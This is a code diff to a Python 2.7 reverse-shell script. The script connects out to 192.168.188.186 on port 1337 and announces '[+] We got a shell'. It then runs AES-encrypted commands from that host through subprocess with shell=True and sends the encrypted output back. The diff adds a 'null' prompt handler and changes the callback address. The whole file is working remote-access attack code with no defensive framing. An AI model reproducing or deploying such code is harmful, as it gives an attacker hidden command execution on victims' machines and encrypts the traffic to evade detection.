@@ -1,7 +1,10 @@
+#!/usr/bin/env python2.7
+
 import subprocess
 import socket 
 import os
 from Crypto.Cipher import AES
+from sys import exit
 import base64
 
 PADDING = '{'
@@ -20,10 +23,14 @@ def processData(s):
 	global cipher
 	while True:
 		data = s.recv(2048)
-		data = decrypt(cipher, data)
-		strData = data
+		strData = decrypt(cipher, data)
 
-		if strData == 'exit':
+		if strData.lower() == 'null':
+			nullmessage = str.encode(os.getcwd() + '> ')
+			nullmessage = encrypt(cipher, nullmessage)
+			s.send(nullmessage)
+
+		if strData.lower() == 'exit':
 			break
 
 		if strData[:2] == "cd":
@@ -33,7 +40,7 @@ def processData(s):
 			except OSError as e:
 				pass
 
-		if len(strData) > 0:
+		if strData != 'null':
 			try:	
 				proc = subprocess.Popen(strData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 				stream = proc.stdout.read() + proc.stderr.read()
@@ -49,7 +56,7 @@ def processData(s):
 
 try:
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(("192.168.0.189", 1337))
+	s.connect(("192.168.188.186", 1337))
 	msg = "[+] We got a shell \r\n"
 	msg = encrypt(cipher, msg)
 	s.send(msg)
